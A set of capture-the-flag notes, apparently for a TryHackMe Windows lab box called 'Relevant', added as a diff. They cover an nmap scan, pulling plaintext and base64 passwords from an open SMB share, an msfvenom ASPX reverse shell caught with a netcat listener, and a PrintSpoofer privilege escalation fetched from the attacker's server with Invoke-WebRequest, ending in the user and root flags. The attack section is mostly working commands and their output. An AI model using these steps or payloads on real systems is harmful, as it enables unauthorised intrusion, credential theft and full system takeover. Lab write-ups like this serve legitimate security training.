@@ -1,0 +1,144 @@
+[Relevant]
+PORT     STATE SERVICE       REASON          VERSION
+80/tcp   open  http          syn-ack ttl 125 Microsoft IIS httpd 10.0
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+135/tcp  open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
+139/tcp  open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds  syn-ack ttl 125 Windows Server 2016 Standard Evaluation 14393 microsoft-ds
+3389/tcp open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: RELEVANT
+|   NetBIOS_Domain_Name: RELEVANT
+|   NetBIOS_Computer_Name: RELEVANT
+|   DNS_Domain_Name: Relevant
+|   DNS_Computer_Name: Relevant
+|   Product_Version: 10.0.14393
+|_  System_Time: 2021-07-23T16:54:17+00:00
+| ssl-cert: Subject: commonName=Relevant
+| Issuer: commonName=Relevant
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2021-07-22T16:49:48
+| Not valid after:  2022-01-21T16:49:48
+| MD5:   e28e 78c4 e5d6 bb9c 9673 bd19 3560 5c73
+| SHA-1: e78b 932c 0d76 cc6f bd69 392b 7434 3493 c252 4ae3
+| -----BEGIN CERTIFICATE-----
+| MIIC1DCCAbygAwIBAgIQX1HKhdlKMqBOt/NkZXJZIDANBgkqhkiG9w0BAQsFADAT
+| MREwDwYDVQQDEwhSZWxldmFudDAeFw0yMTA3MjIxNjQ5NDhaFw0yMjAxMjExNjQ5
+| NDhaMBMxETAPBgNVBAMTCFJlbGV2YW50MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
+| MIIBCgKCAQEApYbCpp1l6xP6HFNNGaQOjxZB26+aClvEdSFxSpknFwmlc/vi/+X0
+| r8uKujhvX8pNlT+36YNx/c4wzLNyk2dcewUU6LKtMfaeH+3hmxxqlnKbxYLFQWiq
+| s6wmQkOsP0Perp36vSEzFRWTa1kbJEpjQEG694rThmrP33NjGlXDKOgcJs1x+Ljk
+| 4QpXVdimGMG3wpVcvwAg6pMtCTVjB/+8SRhUKTe1L3SarSZXBChkPqGKfCSyf10z
+| 1H7UTgFHkcGwjHKrLWGiykdl62tQrUKzidMae9kEyGcTNZGg5lBBTXFl6HaagLCX
+| jzB6I6ulfwdmgiASCKOYKiUs9Cfd0p5IqwIDAQABoyQwIjATBgNVHSUEDDAKBggr
+| BgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBABi6LBiMFeZL
+| e1DtorEDMvhPjyamCOGnve790iKNqTaAhMuHP9qAIuAsy0iv+VWZIWxmY0gxDWfl
+| zM7VFHp4vJnQMKaFaqQINI31rStVqUprddgNeDLYnlZgwtceljOQMNRvKQhn5zDe
+| JNmaiYJnFdJlmlAiS8nS5IcwsWTcf/GQ388Aq2nE+3PJgV+BRVWIsIRvyA6x+3ER
+| ZSMNsEF18B4OfHs32hI76iKvqJz92w6BfMuJIue+HL8WfuS/qYRXY0lDUvqbRUtX
+| 2bbTrazAcB/AolTyATw06zEehebqvjT4HNyRyG321MWNC31fENYOsnGLNtz81qAB
+| QegRZk8TcPo=
+|_-----END CERTIFICATE-----
+|_ssl-date: 2021-07-23T16:54:56+00:00; -1s from scanner time.
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 1h23m59s, deviation: 3h07m51s, median: -1s
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 19742/tcp): CLEAN (Timeout)
+|   Check 2 (port 44142/tcp): CLEAN (Timeout)
+|   Check 3 (port 52602/udp): CLEAN (Timeout)
+|   Check 4 (port 21862/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
+|   Computer name: Relevant
+|   NetBIOS computer name: RELEVANT\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2021-07-23T09:54:16-07:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-07-23T16:54:19
+|_  start_date: 2021-07-23T16:50:37
+
+#Smbclient 
+Enter WORKGROUP\root's password: 
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Sat Jul 25 21:46:04 2020
+  ..                                  D        0  Sat Jul 25 21:46:04 2020
+  passwords.txt                       A       98  Sat Jul 25 15:15:33 2020
+
+                7735807 blocks of size 4096. 4951155 blocks available
+smb: \> get passwords.txt
+getting file \passwords.txt of size 98 as passwords.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+└─$ cat passwords.txt                                                                                                                                             2 ⚙
+[User Passwords - Encoded]
+Qm9iIC0gIVBAJCRXMHJEITEyMw==
+QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
+----------------------------------------
+Bob - !P@$$W0rD!123
+Bill - Juw4nnaM4n420696969!$$$
+
+[Reverse shell]
+Visit the file path on the webserver:
+#Place a shell.aspx on smb remote host
+└─$ sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.4.30.186 LPORT=4444 -f aspx -o thm-shell.aspx
+relevant.thm:49663/nt4wrksv/shell.aspx
+
+[Shell]
+└─$ sudo nc -lvnp 4444                                                                                                                                            1 ⚙
+listening on [any] 4444 ...
+connect to [10.4.30.186] from (UNKNOWN) [10.10.230.185] 49868
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+c:\windows\system32\inetsrv>
+
+[User.txt]
+C:\Users\Bob\Desktop>type user.txt
+type user.txt
+THM{fdk4ka34vk346ksxfr21tg789ktf45}
+____________________________________
+#Bonus Commands
+C:\Windows\system32>dir /b /s *.txt
+dir /b /s *.txt
+------------------------------------
+type filelist.txt | find /n "filename"
+------------------------------------
+C:\Windows\system32>more C:\Users\administrator\Desktop\root.txt && more C:\Users\Bob\Desktop\user.txt
+more C:\Users\administrator\Desktop\root.txt && more C:\Users\Bob\Desktop\user.txt
+THM{1fk5kf469devly1gl320zafgl345pv}
+THM{fdk4ka34vk346ksxfr21tg789ktf45}
+------------------------------------
+
+[Root.txt]
+PRIVILEGES INFORMATION
+----------------------
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+#Getting the exploit
+C:\Users\Bob\Desktop>powershell Invoke-WebRequest -Uri http://10.4.30.186:8081/PrintSpoofer.exe -o spoof.exe
+powershell Invoke-WebRequest -Uri http://10.4.30.186:8081/PrintSpoofer.exe -o spoof.exe
+#Root
+C:\Users\Bob\Desktop>spoof.exe -i -c cmd
+spoof.exe -i -c cmd
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+C:\>type C:\Users\administrator\Desktop\root.txt
+THM{1fk5kf469devly1gl320zafgl345pv}
